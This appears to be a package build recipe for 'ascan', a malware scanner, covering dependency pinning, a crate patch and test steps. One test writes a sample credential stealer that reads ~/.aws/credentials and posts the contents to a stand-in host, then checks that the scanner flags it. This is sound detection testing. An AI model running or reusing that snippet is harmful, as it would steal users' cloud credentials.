#nolint:valid-pipeline-git-checkout-tag
package:
  name: ascan
  version: "2.13.0"
  epoch: 1 # CVE-2026-111943
  description: "Open-source malware detection for the AI age"
  copyright:
    - license: Apache-2.0
  dependencies:
    runtime:
      - 7zip
      - cleave-traits
      - innoextract
      - rizin
      - upx

vars:
  rust-version: "1.99"

environment:
  contents:
    packages:
      - build-base
      - busybox
      - ca-certificates-bundle
      - cargo-auditable
      - git
      - glibc-2.44-dev
      - rust-${{vars.rust-version}}

pipeline:
  # Atomdrift renamed the project from litmus to scan in v2.0.0: the crate is
  # `atomdrift-scan` and the repo moved to .../atomdrift/scan. Upstream moved
  # from Codeberg to GitHub in v2.4.0. Upstream renamed the binary from `ascan`
  # to `atomscan` in v2.3.0; we keep an `ascan` symlink for compatibility with
  # existing consumers of this package.
  - uses: git-checkout
    with:
      repository: https://github.com/atomdrift-project/scan
      tag: v${{package.version}}
      expected-commit: 5efed4de9745ce3e8ed69bfdc1a6d11774278206

  - uses: bump
    with:
      deps: |-
        tract-onnx@0.22.3

  # CVE-2026-111943: bump fails with "crate is absent from the index but is not a
  # known workspace member: cleave (dependent of reqwest)" because webpki-roots
  # is reached through reqwest from the git-sourced cleave and fletch crates, so
  # pin the lock. 1.0.11 drops the emSign roots.
  - runs: |
      cargo update -p 'webpki-roots@1' --precise 1.0.11

  # rust-fs-squashfs 0.4.0 requires lru ^0.12 directly, which carries
  # GHSA-rhfx-m35p-ff5j (fixed in 0.16.3) and adds a second lru copy next to the
  # 0.18 ascan uses. 0.4.0 is the crate's only release, so patch in the published
  # crate with lru relaxed to 0.18. It only uses LruCache::new, len, cap, get and
  # put. Use the published crate and not its git repo, whose Cargo.toml has a
  # `../rust-fs-core` path dependency. Drop this once a release of rust-fs-squashfs
  # moves off lru 0.12.
  - runs: |
      mkdir -p /tmp/rust-fs-squashfs-patched

  # blocked-custom-format: the published crate has a normalized manifest; the git repo's Cargo.toml has a ../rust-fs-core path dependency
  - uses: fetch
    with:
      uri: https://static.crates.io/crates/rust-fs-squashfs/rust-fs-squashfs-0.4.0.crate
      expected-sha256: 071f8b8b71735397efcb72bcaf45ec57e5239ed5a1f3471ab5623581943ee92b
      directory: /tmp/rust-fs-squashfs-patched

  # The crate's manifest has exactly one `version = "0.12"` line, the lru requirement.
  - uses: sed
    with:
      path: /tmp/rust-fs-squashfs-patched/Cargo.toml
      pattern: |-
        ^version = "0\.12"$
      replacement: |-
        version = "0.18"

  # Cargo.toml already has a [patch.crates-io] table, so add the entry to it.
  - uses: sed
    with:
      path: Cargo.toml
      pattern: |-
        ^\[patch\.crates-io\]$
      replacement: |-
        [patch.crates-io]\nrust-fs-squashfs = { path = "/tmp/rust-fs-squashfs-patched" }

  - runs: |
      cargo update -p rust-fs-squashfs
      if grep -A1 '^name = "lru"' Cargo.lock | grep -qE 'version = "0\.([0-9]|1[0-5])\.|version = "0\.16\.[0-2]"'; then
        echo "lru below 0.16.3 still in Cargo.lock"
        exit 1
      fi

  # Model bundle (azoth): ensemble layout (general/ + config.json +
  # route_policies.json + per-filetype/-filegroup specialists). Baked in and
  # pointed at via SCAN_MODELS_DIR so ascan never reaches the network to
  # download a bundle at runtime. Tracks azoth main; pinned to the commit
  # validated against scan v2.4.0.
  - uses: git-checkout
    with:
      repository: https://github.com/atomdrift-project/azoth
      branch: main
      expected-commit: dda17076bf10e6e4c148ae4fdf064857d5fc67db
      destination: azoth

  - uses: cargo/build
    with:
      output: atomscan

  - runs: |
      ln -s atomscan ${{targets.destdir}}/usr/bin/ascan
      mkdir -p ${{targets.destdir}}/usr/share/ascan/models
      cp -r azoth/* ${{targets.destdir}}/usr/share/ascan/models/

  - uses: strip

update:
  enabled: true
  git:
    strip-prefix: v
    tag-filter-prefix: v

test:
  environment:
    environment:
      CLEAVE_TRAITS_DIR: /usr/share/cleave/traits
      SCAN_MODELS_DIR: /usr/share/ascan/models
      # Disable both the version-notice check and the default-on rules/models
      # auto-update added in 2.3.0; tests must not reach the network.
      SCAN_NO_UPDATE: "1"
      SCAN_NO_UPDATE_CHECK: "1"
      # 2.4.0 turned dependency/URL fetching on by default (--fetch=all);
      # `none` is the fully-offline switch.
      SCAN_FETCH: none
  pipeline:
    - uses: test/tw/ldd-check
    - uses: test/tw/ver-check
      with:
        bins: atomscan
    - uses: test/tw/help-check
      with:
        bins: atomscan
    - name: "ascan compat symlink resolves to atomscan"
      runs: |
        test "$(readlink /usr/bin/ascan)" = "atomscan"
        ascan --version
    - name: "Scan a benign script"
      runs: |
        tee /tmp/benign.sh <<'SCRIPT'
        #!/bin/sh
        echo "hello world"
        SCRIPT
        atomscan fs /tmp/benign.sh > /tmp/benign_output.txt 2>&1
        cat /tmp/benign_output.txt
        grep -E "files|clean" /tmp/benign_output.txt
    - name: "Scan a suspicious script"
      runs: |
        # Use a credential-stealer payload from the atomdrift-project/traits
        # simple-stealer corpus (08-linux-aws-credentials.py). It reads
        # ~/.aws/credentials and POSTs the contents to a remote host, which
        # is flagged hostile by the rule-based "uploads credential contents
        # via HTTP" finding. Since 2.12 the shell variants of this corpus
        # (e.g. 01-linux-aws-env-curl.sh) no longer clear the stricter
        # trait-floor corroboration requirements and scan clean. This file
        # is only written to disk and scanned — never executed.
        tee /tmp/suspicious.py <<'SCRIPT'
        #!/usr/bin/env python3
        from pathlib import Path
        import requests

        creds = Path.home() / ".aws/credentials"
        requests.post("https://collector.example/aws", data=creds.read_text())
        SCRIPT
        rc=0
        atomscan fs /tmp/suspicious.py >/tmp/suspicious_output.txt 2>&1 || rc=$?
        cat /tmp/suspicious_output.txt
        grep -iE "suspicious|hostile" /tmp/suspicious_output.txt
        # atomscan exits non-zero when threats are detected; verify it did so
        [ "$rc" -ne 0 ]
    - name: "JSON output format"
      runs: |
        echo '#!/bin/sh' > /tmp/json_test.sh
        echo 'echo hello' >> /tmp/json_test.sh
        atomscan --format json fs /tmp/json_test.sh > /tmp/json_output.txt 2>&1
        cat /tmp/json_output.txt
        grep -F '"ml"' /tmp/json_output.txt
    - name: "Scan a directory"
      runs: |
        mkdir -p /tmp/ascan_scan
        echo '#!/bin/sh' > /tmp/ascan_scan/a.sh
        echo 'echo ok' >> /tmp/ascan_scan/a.sh
        echo '#!/bin/sh' > /tmp/ascan_scan/b.sh
        echo 'echo ok' >> /tmp/ascan_scan/b.sh
        atomscan fs /tmp/ascan_scan > /tmp/dir_output.txt 2>&1
        grep -E "files" /tmp/dir_output.txt
